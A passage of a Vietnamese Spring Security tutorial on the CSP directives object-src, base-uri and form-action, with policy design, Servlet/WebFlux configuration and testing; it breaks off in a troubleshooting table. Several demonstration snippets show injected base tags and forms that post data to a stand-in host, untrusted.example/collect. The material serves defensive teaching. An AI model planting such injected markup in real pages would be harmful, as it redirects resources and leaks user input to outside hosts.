# object-src, base-uri và form-action

> **Chương:** Chính sách nội dung CSP  
> **Mô-đun:** `SPRING_SECURITY_HTTP_PROTECTION` — áp dụng các lớp phòng vệ HTTP và trình duyệt trong Spring Security, từ CSRF, CORS, security headers, CSP, HSTS đến HTTP firewall và bảo vệ session. Người học cấu hình cho Servlet lẫn Reactive, kiểm thử các kịch bản tấn công web và chẩn đoán xung đột bảo mật khi triển khai.

## 1. Ba directive nhỏ nhưng có vai trò riêng

Khi bàn về **Content Security Policy (CSP)**, lập trình viên thường nghĩ ngay đến `script-src` để giảm nguy cơ thực thi JavaScript bị chèn. Tuy nhiên, một trang còn có thể bị tác động qua phần tử nhúng, URL gốc của tài liệu và đích gửi biểu mẫu. Ba directive xử lý các rủi ro khác nhau:

- **`object-src`** giới hạn tài nguyên có thể được nạp bởi `<object>`, `<embed>` và một số phần tử nhúng liên quan.
- **`base-uri`** giới hạn URL mà tài liệu được phép đặt trong `<base href="...">`, qua đó kiểm soát việc thay đổi cách phân giải các đường dẫn tương đối.
- **`form-action`** giới hạn URL đích của việc gửi biểu mẫu HTML.

Giả sử một trang thanh toán render nhầm bình luận người dùng như HTML. Kẻ tấn công có thể thử chèn:

~~~html
<!-- Ba hướng thao tác khác nhau; chỉ minh họa trong môi trường kiểm thử -->
<object data="https://untrusted.example/embedded-content"></object>
<base href="https://untrusted.example/">
<form action="https://untrusted.example/collect" method="post">
    <input name="note" value="example">
    <button type="submit">Gửi</button>
</form>
~~~

Một CSP được thiết kế đúng có thể giảm tác động của các phần tử này. Chẳng hạn:

~~~http
Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
~~~

Chính sách này không cho phép nội dung nhúng dạng object, từ chối việc thiết lập thẻ `<base>` và hạn chế đích form về cùng origin.

Sau bài học, bạn cần nắm được:

1. Mỗi directive áp dụng cho phần tử hoặc hành vi nào và không áp dụng cho những gì.
2. Điểm khác biệt quan trọng: `object-src` có thể dùng fallback từ `default-src`, còn `base-uri` và `form-action` **không**.
3. Cách thiết kế chính sách cho ứng dụng có biểu mẫu, tài liệu PDF, đăng nhập, SSO và trang nhúng.
4. Cách cấu hình trong Spring Security Servlet và Reactive/WebFlux.
5. Cách kiểm thử trình duyệt và nhận diện xung đột khi triển khai qua nhiều security chain hoặc proxy.

## 2. Đặt ba directive vào đúng vị trí của CSP

Một CSP là chuỗi directive mà server gửi trong HTTP response của tài liệu HTML:

~~~http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
~~~

Trình duyệt diễn giải chính sách này trong ngữ cảnh của **tài liệu nhận response**. Spring Security giúp xuất header, nhưng chính ứng dụng phải lựa chọn directive tương ứng với kiến trúc và chức năng thực tế.

| Directive | Câu hỏi nó trả lời | Có fallback từ `default-src`? |
|---|---|---|
| `object-src` | Tài liệu được tải nguồn nào qua object/embed? | **Có**, nếu không khai báo `object-src` |
| `base-uri` | Tài liệu được dùng URL nào làm base URL? | **Không** |
| `form-action` | Biểu mẫu HTML được gửi đến URL nào? | **Không** |
| `script-src` | Nguồn và cách thực thi JavaScript nào được chấp nhận? | Có, theo chuỗi fallback của loại script |
| `frame-src` | Trang hiện tại được tải iframe nào? | Có, theo chuỗi fallback của frame |
| `frame-ancestors` | Những origin nào được phép nhúng trang hiện tại? | Không |
| `connect-src` | JavaScript được khởi tạo kết nối đến đâu? | Có |

**Ranh giới cần nhớ:** `default-src 'none'` không phải lệnh “cấm tất cả mọi hành vi trong browser”. Nó là nguồn dự phòng cho những *fetch directive* có quy tắc fallback. Vì vậy, dù đã đặt `default-src 'none'`, bạn vẫn cần đánh giá `base-uri`, `form-action` và `frame-ancestors` riêng.

Trong source list:

- `'self'` nghĩa là cùng origin với tài liệu, xét theo scheme, host và port theo quy tắc của trình duyệt; không mặc nhiên bao gồm mọi subdomain.
- `'none'` biểu thị không cho nguồn nào; nên dùng riêng trong source list đó.
- `https://partner.example` là một nguồn được chỉ định cụ thể; khác với nguồn rộng `https:` hoặc `*`.
- Từ khóa `'self'` và `'none'` phải có dấu nháy đơn trong cú pháp CSP.

## 3. object-src: hạn chế các phần tử object và embed

Trong HTML có các dạng nội dung nhúng như:

~~~html
<object data="/documents/manual.pdf" type="application/pdf"></object>
<embed src="/documents/guide.pdf" type="application/pdf">
~~~

Các phần tử `<object>`/`<embed>` từng được dùng rộng rãi để nhúng nội dung chủ động hoặc plugin. Nhiều plugin cũ không còn được trình duyệt hiện đại hỗ trợ, nhưng cấu hình `object-src` vẫn là một cách giảm bề mặt nhúng ngoài ý muốn.

Một ứng dụng không cần những phần tử này có thể dùng:

~~~http
Content-Security-Policy: object-src 'none'
~~~

Khi trình duyệt thực thi policy, các lần tải thuộc phạm vi `object-src` sẽ bị từ chối. Điều đó có thể chặn cả object nhúng **từ cùng origin**. Vì thế, nếu hệ thống đang hiển thị PDF qua `<object>`, phải kiểm tra tính năng đó trước khi áp dụng.

### Vì sao vẫn khai báo object-src 'none' dù đã có default-src?

So sánh:

~~~http
Content-Security-Policy: default-src 'none'
~~~

với:

~~~http
Content-Security-Policy: default-src 'self'; object-src 'none'
~~~

Ở chính sách thứ nhất, khi `object-src` vắng mặt, trình duyệt có thể dùng `default-src 'none'` làm fallback. Ở chính sách thứ hai, ứng dụng cho phép nhiều tài nguyên cùng origin theo mặc định nhưng vẫn **cấm object/embed** một cách tường minh.

Viết `object-src 'none'` có lợi khi policy thay đổi sau này: nhóm phát triển có thể mở `default-src` cho một nhu cầu hợp lệ mà không vô tình mở luôn những phần tử object nhúng. Đây cũng là một thành phần thường gặp trong CSP chặt kết hợp với `base-uri` và giới hạn script.

### Nếu ứng dụng thật sự cần nhúng PDF

Không nên tự động bỏ bảo vệ chỉ vì có trang tài liệu. Trước tiên xác định cách hiển thị:

| Cách trình bày tài liệu | Directive thường liên quan |
|---|---|
| Liên kết tải PDF thông thường | Không phải một yêu cầu `object-src` chỉ vì URL là PDF |
| PDF được nhúng bằng `<object>` hoặc `<embed>` | `object-src` |
| PDF hoặc tài liệu được nhúng bằng `<iframe>` | `frame-src` của trang cha và các giới hạn khác áp dụng |
| Dùng JavaScript `fetch` để lấy PDF rồi tự render | `connect-src` cho fetch; các tài nguyên phụ có thể có directive khác |

Ví dụ nếu sản phẩm có lý do xác đáng để duy trì object từ cùng origin:

~~~http
Content-Security-Policy: default-src 'self'; object-src 'self'
~~~

Chính sách này mở lại cả các nguồn object phù hợp với `'self'`, không chỉ một PDF cụ thể. Cần đánh giá khả năng upload và phục vụ nội dung từ cùng origin trước khi lựa chọn. Khi không có yêu cầu thực sự, `object-src 'none'` là điểm khởi đầu dễ kiểm soát hơn.

### object-src không thay thế frame-src và frame-ancestors

Ba tên này xử lý những chiều khác nhau:

- `object-src`: nguồn nạp qua object/embed.
- `frame-src`: nguồn tài liệu iframe mà trang hiện tại nạp.
- `frame-ancestors`: website nào được nhúng **trang hiện tại** vào iframe hoặc khung tương ứng.

Ví dụ `object-src 'none'` không đồng nghĩa với việc chặn mọi iframe. Muốn hạn chế iframe, chọn `frame-src`/`frame-ancestors` theo đúng nhu cầu.

## 4. base-uri: bảo vệ cách trình duyệt phân giải URL tương đối

HTML cho phép khai báo base URL:

~~~html
<head>
    <base href="https://static.example.com/assets/">
</head>
<body>
    <script src="js/app.js"></script>
    <a href="help">Hướng dẫn</a>
</body>
~~~

Trong ví dụ này, các URL tương đối như `js/app.js` hoặc `help` có thể được phân giải dựa trên `https://static.example.com/assets/` thay vì đường dẫn ban đầu của tài liệu. `<base>` có thể thay đổi hành vi của **nhiều đường dẫn tương đối**, không chỉ script.

Điều đó trở thành rủi ro khi kẻ tấn công chèn được HTML vào một vùng của tài liệu và tác động đến `<base href>`. Chẳng hạn:

~~~html
<!-- Phần bị chèn trong môi trường kiểm thử có kiểm soát -->
<base href="https://untrusted.example/">

<!-- Các phần tử hợp lệ của trang có đường dẫn tương đối -->
<script src="js/app.js"></script>
<a href="account">Tài khoản</a>
~~~

Nếu một thẻ `<base>` bị chèn được trình duyệt chấp nhận và có hiệu lực, URL tương đối có thể trỏ sang nguồn khác:

~~~text
js/app.js  →  https://untrusted.example/js/app.js
account    →  https://untrusted.example/account
~~~

Đây là *base-tag injection*: một đoạn HTML tưởng như không chứa JavaScript vẫn có thể thay đổi đích tài nguyên và liên kết. Các directive như `script-src` có thể tiếp tục chặn một script ngoài danh sách, nhưng việc đổi liên kết và đường dẫn tương đối vẫn có thể gây lỗi hoặc tạo hướng điều hướng ngoài dự tính.

### base-uri 'none' và base-uri 'self'

Nếu ứng dụng không cần thẻ `<base>`, cách khép chặt là:

~~~http
Content-Security-Policy: base-uri 'none'
~~~

Khi policy được thực thi, browser từ chối việc áp dụng các base URL do thẻ `<base>` thiết lập. Trang vẫn có base URL mặc định theo URL tài liệu; `base-uri 'none'` **không** có nghĩa mọi URL tương đối trên trang đều ngừng hoạt động.

Nếu ứng dụng thật sự cần thẻ `<base href>` trỏ tới cùng origin:

~~~http
Content-Security-Policy: base-uri 'self'
~~~

Chính sách này cho phép các base URL phù hợp với cùng origin và từ chối base URL ngoài origin. Tuy nhiên, ngay cả một base URL ở **cùng origin nhưng khác đường dẫn** vẫn có thể làm thay đổi ý nghĩa của liên kết tương đối. Vì vậy, `base-uri 'none'` thường thích hợp hơn khi không có yêu cầu sử dụng `<base>`.

| Tình huống | `base-uri 'none'` | `base-uri 'self'` |
|---|---|---|
| Không có `<base>` trong HTML | Không ảnh hưởng đường dẫn tương đối vốn có của tài liệu | Tương tự |
| `<base href="https://app.example.com/assets/">` khi trang có cùng origin | Từ chối base được khai báo | Có thể cho phép |
| `<base href="https://untrusted.example/">` | Từ chối | Từ chối |
| Ứng dụng cần thẻ base để phục vụ SPA dưới đường dẫn riêng | Cần đổi cách thiết kế hoặc policy | Có thể đáp ứng nếu base URL cùng origin |

### default-src không bảo vệ base-uri

Đây là **lỗi suy luận thường gặp**:

~~~http
Content-Security-Policy: default-src 'none'
~~~

Chính sách này không tự tạo quy tắc `base-uri 'none'`. Nếu ứng dụng muốn ngăn thay đổi base URL, phải khai báo `base-uri` riêng:

~~~http
Content-Security-Policy: default-src 'none'; base-uri 'none'
~~~

**Giới hạn của base-uri:** nó không đặt allowlist cho mọi liên kết người dùng bấm vào, không chặn toàn bộ điều hướng ra ngoài, không kiểm soát `fetch` và không thay thế `form-action`. Nó chỉ xử lý base URL của tài liệu theo phạm vi CSP.

## 5. form-action: giới hạn đích gửi biểu mẫu HTML

Một biểu mẫu có thể làm browser gửi dữ liệu bằng GET hoặc POST tới một URL:

~~~html
<form method="post" action="/profile/update">
    <label>
        Tên hiển thị
        <input name="displayName">
    </label>
    <button type="submit">Lưu</button>
</form>
~~~

Đối với ứng dụng phục vụ trên `https://app.example.com`, đích `/profile/update` là cùng origin. Nếu ứng dụng muốn giữ tất cả form ở chính origin:

~~~http
Content-Security-Policy: form-action 'self'
~~~

Với chính sách thực thi này, một form cố gửi tới `https://untrusted.example/collect` sẽ bị CSP chặn ở mức trình duyệt hỗ trợ.

### Ví dụ chèn biểu mẫu với đích ngoài

~~~html
<!-- Chỉ dùng để thử trong môi trường do bạn kiểm soát -->
<form action="https://untrusted.example/collect" method="post">
    <input name="demoValue" value="sample">
    <button type="submit">Gửi thử</button>
</form>
~~~

Khi có `form-action 'self'`, browser không được phép submit form đến nguồn ngoài đó theo chính sách. Điều này có ích nếu một lỗi HTML injection tạo ra form giả mạo hoặc vô tình chuyển dữ liệu đi nơi khác.

**Nhưng `form-action` không xóa biểu mẫu bị chèn khỏi giao diện.** Form giả mạo vẫn có thể được hiển thị; người dùng có thể bị đánh lừa bởi nội dung của trang. Hơn nữa, nếu kẻ tấn công tìm được một endpoint cùng origin nhận và chuyển tiếp dữ liệu ngoài dự tính, `form-action 'self'` không thể tự xác minh logic nghiệp vụ của endpoint ấy.

### form-action còn xét đích từ thuộc tính formaction

Không chỉ thuộc tính `action` trên form mới quyết định đích gửi. Một nút submit có thể khai báo đích thay thế:

~~~html
<form method="post" action="/orders/confirm">
    <input name="orderId" value="123">
    <button type="submit">Xác nhận</button>
    <button
        type="submit"
        formaction="https://untrusted.example/collect">
        Gửi nơi khác
    </button>
</form>
~~~

Khi người dùng bấm nút thứ hai, hành động submit sử dụng URL `formaction` của nút, không phải `action` mặc định của form. CSP `form-action` kiểm soát **đích submit thực tế**, nên cần kiểm thử cả những nhánh UI sử dụng `formaction`.

### form-action 'none', 'self' và danh sách nguồn

| Policy | Ý nghĩa | Khi nào phù hợp |
|---|---|---|
| `form-action 'none'` | Cấm mọi đích submit form theo CSP | Trang hoàn toàn không sử dụng form |
| `form-action 'self'` | Chỉ cho phép submit cùng origin | Đăng nhập, cập nhật hồ sơ, form nội bộ |
| `form-action 'self' https://payments.example.net` | Cho phép cùng origin và nguồn thanh toán cụ thể | Form tích hợp thanh toán có đích đã được đánh giá |
| Không khai báo `form-action` | Không có giới hạn đích form do directive này đặt ra | Cần xem xét rủi ro, không suy ra từ `default-src` |

Tránh mở quá rộng như:

~~~http
Content-Security-Policy: form-action https:
~~~

Nó có thể chấp nhận nhiều đích HTTPS hơn nhu cầu thực tế. Việc website dùng HTTPS là điều kiện cần cho kết nối an toàn, nhưng không có nghĩa mọi host HTTPS đều là đích submit được tin cậy.

### Các luồng đăng nhập, thanh toán và chuyển hướng

Nếu ứng dụng có biểu mẫu POST trực tiếp đến một nhà cung cấp SSO hoặc thanh toán ở origin khác, `form-action 'self'` có thể chặn bước gửi form đó. Hãy xác định **đích POST thực tế**, rồi mở đúng origin cần thiết sau khi đánh giá.

Một luồng OAuth/OIDC chỉ dùng chuyển hướng browser không nhất thiết cần thêm nhà cung cấp vào `form-action`, vì `form-action` quản lý **việc submit form**, không phải mọi chuyển hướng của trang. Ngược lại, một cơ chế SAML POST binding dùng form tự submit tới identity provider có thể cần đích form khác origin.

**Lưu ý về redirect sau khi submit:** việc trình duyệt kiểm tra `form-action` với từng bước trong chuỗi redirect có chi tiết tương thích khác nhau giữa các browser/phiên bản. Không xem `form-action` là cơ chế chống rò rỉ tuyệt đối qua mọi chuỗi chuyển hướng. Ứng dụng vẫn phải kiểm soát endpoint redirect và URL đích ở phía server.

## 6. Phân biệt form-action với connect-src, CORS và CSRF

Các cơ chế sau đều liên quan đến HTTP, nhưng kiểm soát những việc khác nhau:

| Cơ chế | Giới hạn chính | Ví dụ |
|---|---|---|
| CSP `form-action` | Đích submit **HTML form** của tài liệu | `<form action="...">` và `formaction` |
| CSP `connect-src` | Kết nối do script khởi tạo như `fetch`, XHR, WebSocket | `fetch("https://api.example.com")` |
| CORS | Việc JavaScript ở origin A được đọc response cross-origin từ server B | API trả `Access-Control-Allow-Origin` |
| CSRF protection | Việc server nhận thao tác thay đổi trạng thái có đến từ yêu cầu hợp lệ không | CSRF token, kiểm tra request theo chính sách server |
| Cookie `SameSite` | Khi nào cookie được gửi trong ngữ cảnh cross-site | Cookie phiên của người dùng |

Xét hai cách gửi dữ liệu:

~~~html
<form action="https://payments.example.net/submit" method="post">
    <button type="submit">Thanh toán</button>
</form>
~~~

~~~javascript
fetch("https://api.example.net/orders", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ orderId: 123 })
});
~~~

Form HTML chịu `form-action`; yêu cầu `fetch` chịu `connect-src`. Một danh sách nguồn ở directive này **không tự mở** danh sách nguồn của directive kia. Nếu backend API cấp CORS thành công nhưng CSP `connect-src` chặn kết nối, JavaScript vẫn không tạo được kết nối mong muốn theo chính sách của trang.

**Đặc biệt:** `form-action 'self'` không phải cơ chế chống CSRF cho server. Một trang độc hại khác có thể cố gửi form đến server của bạn từ origin của chính nó; CSP trong **trang của bạn** không được áp lên trang của kẻ tấn công. Server vẫn phải dùng CSRF protection, cookie phù hợp và xác minh nghiệp vụ cho các thao tác thay đổi trạng thái.

## 7. Vì sao ba directive nên được dùng cùng nhau?

Xét một ứng dụng có lỗi HTML injection trong vùng bình luận:

~~~mermaid
flowchart TD
    A[Dữ liệu không đáng tin bị render như HTML] --> B{Nội dung được chèn}
    B --> C[object hoặc embed]
    B --> D[base href ngoài origin]
    B --> E[form action ngoài origin]
    C --> F[object-src none chặn tải nhúng]
    D --> G[base-uri none chặn base URL]
    E --> H[form-action self chặn submit ngoài origin]
    F --> I[Các lớp bảo vệ bổ sung]
    G --> I
    H --> I
    I --> J[Escape/Sanitize, kiểm soát URL, CSRF, session, CORS]
~~~

Mỗi directive giảm một bề mặt khác nhau:

- `object-src 'none'`: không cho nội dung nhúng dạng object hoạt động.
- `base-uri 'none'`: không cho một phần tử `<base>` làm đổi base URL của tài liệu.
- `form-action 'self'`: không cho form submit trực tiếp đến đích ngoài danh sách nguồn.

Tuy nhiên, không directive nào tự bảo đảm rằng HTML bị chèn không xuất hiện. Chúng cũng không tự kiểm soát mọi loại navigation, tải ảnh, gửi dữ liệu từ script hoặc hành vi server. Một script đã được cấp phép vẫn có thể gọi API theo `connect-src`; một form cùng origin vẫn có thể submit tới endpoint có logic lỗi. **CSP là lớp phòng vệ bổ sung, không phải bộ lọc HTML hoặc giải pháp kiểm soát nghiệp vụ.**

### Tình huống bị chèn base và form cùng lúc

Giả sử một trang có form dùng URL tương đối:

~~~html
<form action="submit" method="post">
    <input name="memo">
    <button type="submit">Gửi</button>
</form>
~~~

Một thẻ `<base>` có hiệu lực có thể ảnh hưởng cách phân giải URL tương đối, nên hai cơ chế `base-uri` và `form-action` hỗ trợ nhau:

1. `base-uri 'none'` ngăn việc dùng thẻ base để thay đổi cách phân giải.
2. `form-action 'self'` giới hạn đích gửi form dù có thay đổi URL theo đường khác.
3. Bảo vệ server kiểm tra CSRF token, quyền của người dùng, giá trị trường form và mọi URL redirect.

Không nên dựa vào chỉ một bước rồi bỏ qua những bước còn lại.

## 8. Thiết kế chính sách theo nhu cầu thực tế

Giả sử dashboard `https://app.example.com` có:

- Script/CSS/ảnh/font phục vụ từ cùng origin.
- Form đăng nhập và cập nhật tài khoản submit tới cùng origin.
- Không cần `<base>`.
- Không dùng object/embed để nhúng file.
- Một API `https://api.example.net` được gọi bằng `fetch`.
- Không cho trang khác nhúng dashboard.

Chính sách tham khảo:

~~~http
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self' https://api.example.net; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
~~~

Đây là **chính sách minh họa**, không phải đáp án cố định cho mọi ứng dụng. Nó giả định frontend không cần JavaScript/CSS inline, không dùng frame hoặc media bên ngoài. Nếu có nhu cầu thật, cần kiểm kê và bổ sung nguồn cho đúng directive.

| Thay đổi sản phẩm | Cần xem xét directive nào? | Điều không nên làm |
|---|---|---|
| Thêm PDF viewer qua `<object>` | `object-src` hoặc đổi sang cách hiển thị khác | Mở `object-src *` cho toàn website |
| Đổi đường dẫn asset bằng `<base>` | `base-uri` và URL tương đối | Bỏ hẳn `base-uri` mà không xác định rủi ro |
| SAML form POST sang identity provider | `form-action` cho đúng IdP origin | Mở `form-action https:` |
| Gọi thêm API bằng `fetch` | `connect-src` và CORS của API | Sửa `form-action` để xử lý lỗi fetch |
| Thêm iframe trợ giúp | `frame-src`; có thể cần kiểm tra policy của trang trong iframe | Tưởng `object-src` đã cấp quyền iframe |
| Cho đối tác nhúng dashboard | `frame-ancestors` | Tưởng `frame-src` kiểm soát trang nào nhúng mình |

### Lựa chọn base-uri self thay cho none

Một số frontend sử dụng:

~~~html
<base href="/portal/">
~~~

để định hướng URL tương đối trong ứng dụng phục vụ dưới `/portal/`. Trong trường hợp này, `base-uri 'none'` có thể làm sai cách phân giải URL vốn được thiết kế. `base-uri 'self'` là một lựa chọn nếu base URL chỉ trỏ đến cùng origin và ứng dụng đã đánh giá ảnh hưởng lên các liên kết.

Tốt hơn, nếu không cần thẻ base, có thể dùng URL tuyệt đối theo path (ví dụ `/portal/js/app.js`) hoặc URL được template framework sinh đúng, rồi giữ `base-uri 'none'`.

## 9. Cấu hình với Spring Security Servlet

Trong Spring MVC/Servlet, dùng `SecurityFilterChain` và `HttpSecurity.headers(...).contentSecurityPolicy(...)`. Chuỗi directive dưới đây do ứng dụng quyết định:

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
class SecurityConfig {

    private static final String CSP_POLICY =
        "default-src 'none'; " +
        "script-src 'self'; " +
        "style-src 'self'; " +
        "img-src 'self'; " +
        "font-src 'self'; " +
        "connect-src 'self' https://api.example.net; " +
        "object-src 'none'; " +
        "base-uri 'none'; " +
        "form-action 'self'; " +
        "frame-ancestors 'none'";

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(CSP_POLICY)
            )
        );

        // Cấu hình authorization, CSRF, CORS, session... theo nhu cầu
        // ứng dụng. CSP không tự thay thế những cơ chế này.
        return http.build();
    }
}
~~~

Sau khi request trang HTML đi qua chain này, response dự kiến có `Content-Security-Policy`. Spring Security không tự suy ra những URL hợp lệ từ template và không chọn CSP đầy đủ thay ứng dụng.

### Cấu hình thay thế bằng ContentSecurityPolicyHeaderWriter

Trong Servlet stack, dự án có thể đăng ký writer trực tiếp:

~~~java
import org.springframework.security.web.header.writers.ContentSecurityPolicyHeaderWriter;

ContentSecurityPolicyHeaderWriter writer =
    new ContentSecurityPolicyHeaderWriter(
        "default-src 'self'; " +
        "object-src 'none'; " +
        "base-uri 'none'; " +
        "form-action 'self'"
    );

http.headers(headers -> headers.addHeaderWriter(writer));
~~~

Đây là **phương án thay thế** cho cấu hình CSP DSL trong cùng chain. Không cần gắn cùng một CSP hai lần. Nếu proxy hoặc cấu hình khác trả thêm CSP thực thi, browser có thể áp dụng nhiều chính sách đồng thời; tài nguyên phải thỏa các giới hạn liên quan trong tất cả các policy.

### Lưu ý các SecurityFilterChain và trang lỗi

Trong ứng dụng có nhiều `SecurityFilterChain`, cần kiểm tra chain thực sự xử lý `/login`, `/account/**` và các trang HTML quan trọng. Header CSP gắn ở chain `/api/**` **không tự áp** cho HTML do một frontend server khác phục vụ.

Nếu trang lỗi do reverse proxy, container hoặc một service khác trả, hãy kiểm tra response HTML cuối cùng. Chỉ nhìn header của một API JSON hoặc của response redirect không đủ xác nhận policy đang bảo vệ tài liệu người dùng thấy.

## 10. Cấu hình với Spring Security Reactive/WebFlux

Với WebFlux, sử dụng `ServerHttpSecurity` và `SecurityWebFilterChain`:

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.web.server.SecurityWebFilterChain;

@Configuration
class ReactiveSecurityConfig {

    @Bean
    SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
        String policy =
            "default-src 'none'; " +
            "script-src 'self'; " +
            "style-src 'self'; " +
            "img-src 'self'; " +
            "font-src 'self'; " +
            "connect-src 'self' https://api.example.net; " +
            "object-src 'none'; " +
            "base-uri 'none'; " +
            "form-action 'self'; " +
            "frame-ancestors 'none'";

        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(policy)
            )
        );
        return http.build();
    }
}
~~~

API cấu hình giữa Servlet và Reactive khác nhau, nhưng ý nghĩa của ba directive là **giống nhau ở phía browser**. Trong WebFlux cũng cần xác định service nào trả HTML; nếu frontend được phục vụ từ CDN còn Spring chỉ cung cấp JSON, CSP của tài liệu HTML phải được phát từ nơi cung cấp HTML.

## 11. Report-Only: quan sát xung đột trước khi chặn

Trong ứng dụng đang vận hành, bật ngay `base-uri 'none'` hoặc `form-action 'self'` có thể làm hỏng trang dùng `<base>` hoặc một form SSO hợp lệ. Có thể thử policy bằng:

~~~http
Content-Security-Policy-Report-Only: default-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
~~~

Tuy nhiên, cần phân biệt **mức hỗ trợ Report-Only theo directive và trình duyệt**. Một số kiểm tra navigation hoặc thuộc nhóm non-fetch directive có cách hỗ trợ báo cáo khác với script/style. Chẳng hạn, `frame-ancestors` không có hiệu lực trong Report-Only theo cùng cách với enforced policy ở nhiều trường hợp. Không xem việc “không thấy report” là bằng chứng `base-uri` hay `form-action` đã được thử đầy đủ.

Chế độ Report-Only không tự chặn hành vi vi phạm; hiệu lực chặn thực tế cần kiểm chứng với header `Content-Security-Policy` ở môi trường kiểm soát được. Nếu muốn nhận báo cáo qua HTTP, phải thiết kế endpoint và `report-uri`/`report-to` phù hợp với mức hỗ trợ trình duyệt. DevTools Console/Issues có thể hỗ trợ quan sát thủ công.

Quy trình đề xuất:

1. Kiểm kê trang có `<base>`, `<object>`/`<embed>` và các form gửi đi khác origin.
2. Đưa candidate policy vào Report-Only để thu tín hiệu, kiểm tra browser mục tiêu và luồng nghiệp vụ thật.
3. Sửa template hoặc mở đúng nguồn hợp lệ; tránh nguồn rộng như `*`, `https:`.
4. Bật enforced CSP ở môi trường kiểm thử; xác nhận form, tài liệu nhúng và URL tương đối vẫn hoạt động đúng.
5. Triển khai có kiểm soát và tiếp tục kiểm tra trên response HTML thực tế.

## 12. Kiểm thử phía server: HTTP header được trả đúng

Trước khi thử trong browser, có thể kiểm tra Spring Security xuất đúng policy.

### Servlet với MockMvc

Giả sử ứng dụng có route HTML `/dashboard` và đã bật Spring Security filters trong cấu hình test:

~~~java
import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;

mockMvc.perform(get("/dashboard"))
    .andExpect(header().string(
        "Content-Security-Policy",
        containsString("object-src 'none'")
    ))
    .andExpect(header().string(
        "Content-Security-Policy",
        containsString("base-uri 'none'")
    ))
    .andExpect(header().string(
        "Content-Security-Policy",
        containsString("form-action 'self'")
    ));
~~~

### Reactive với WebTestClient

~~~java
// Trong lớp test WebFlux đã có WebTestClient và route HTML /dashboard.
webTestClient.get()
    .uri("/dashboard")
    .exchange()
    .expectHeader()
    .valueMatches(
        "Content-Security-Policy",
        ".*object-src 'none'; base-uri 'none'; form-action 'self'.*"
    );
~~~

Kiểm tra bằng `valueMatches` ở đây giả định thứ tự directive đúng như cấu hình mẫu. Nếu policy được xây bằng cơ chế khác, nên kiểm tra các đoạn riêng hoặc parse header để tránh phụ thuộc không cần thiết vào thứ tự. Các test server chỉ chứng minh header được xuất, **không chứng minh browser đã chặn mọi hành vi**.

## 13. Kiểm thử trình duyệt theo từng directive

Để kiểm chứng, tạo một trang demo trong môi trường có quyền kiểm soát; không gửi dữ liệu nhạy cảm thật sang các domain thử nghiệm. Với policy:

~~~http
Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
~~~

hãy thử những hành vi:

| Thử nghiệm | Kết quả kỳ vọng theo CSP | Nơi kiểm tra |
|---|---|---|
| `<object data="/documents/demo.pdf">` | Bị chặn bởi `object-src 'none'` dù cùng origin | Console/Network |
| `<embed src="/documents/demo.pdf">` | Bị chặn bởi `object-src 'none'` | Console/Network |
| `<base href="https://untrusted.example/">` | Base URL đó không được áp dụng | Console và cách URL tương đối được phân giải |
| `<base href="/portal/">` | Không được áp dụng bởi `base-uri 'none'` | Kiểm tra base URL |
| Form POST đến `/profile/update` | Được phép về mặt CSP | Network và server |
| Form POST đến `https://untrusted.example/collect` | Bị chặn bởi `form-action 'self'` | Console/Network |
| Nút có `formaction="https://untrusted.example/collect"` | Bị chặn khi submit | Console/Network |
| `fetch("https://untrusted.example/api")` | Chịu `connect-src`/CORS, không do `form-action` quyết định | Console/Network |
| Iframe ngoài origin | Do `frame-src` hoặc fallback tương ứng quyết định; không phải `object-src` | Console/Network |

Với `base-uri`, một cách kiểm tra hữu ích là xem URL gốc được trình duyệt áp dụng cho tài liệu sau khi thử thêm thẻ base:

~~~javascript
// Chỉ dùng trong trang demo có kiểm soát:
console.log(document.baseURI);
~~~

Nếu `base-uri 'none'` có hiệu lực, một `<base href>` trái policy không được phép thay đổi base URL. Cần chú ý rằng browser có thể xử lý thứ tự thẻ `<base>` trong HTML; để thử nhất quán, xây riêng các trang demo có/thử không có base tag từ đầu, thay vì chỉ chèn thêm nhiều base tag sau khi trang đã tải.

### Các bước kiểm thử có thể lặp lại

1. Mở DevTools → Network, chọn request **HTML document** và xem toàn bộ `Content-Security-Policy` header thực nhận.
2. Tạo riêng từng tình huống object/embed, base tag, form submit để tránh nhiều tác động trộn lẫn.
3. Quan sát Console/Issues và Network; ghi tên directive dẫn đến chặn và trạng thái request.
4. Đối chiếu với trường hợp hợp lệ cùng origin. Một thao tác hợp lệ theo CSP vẫn có thể lỗi vì HTTP 404/500, CSRF token, quyền truy cập hoặc logic server.
5. Thử trên các trình duyệt mà ứng dụng hỗ trợ, nhất là các luồng form submit dẫn đến redirect hoặc tích hợp SSO/payment.
6. Nếu có proxy/CDN, kiểm tra response cuối cùng: một CSP khác có thể đang áp dụng đồng thời.

Một trang demo dùng `form-action 'none'` sẽ không submit được bất kỳ form nào theo CSP, kể cả form đăng nhập cùng origin. Vì vậy không nên đổi sang `'none'` trên trang có form chỉ để “chặt nhất”.

## 14. Xung đột thường gặp khi vận hành

| Triệu chứng | Nguyên nhân cần kiểm tra | Cách xử lý |
|---|---|---|
| PDF viewer qua `<object>` bị trắng | `object-src 'none'` chặn object | Chuyển cách hiển thị hoặc đánh giá mở nguồn tối thiểu |
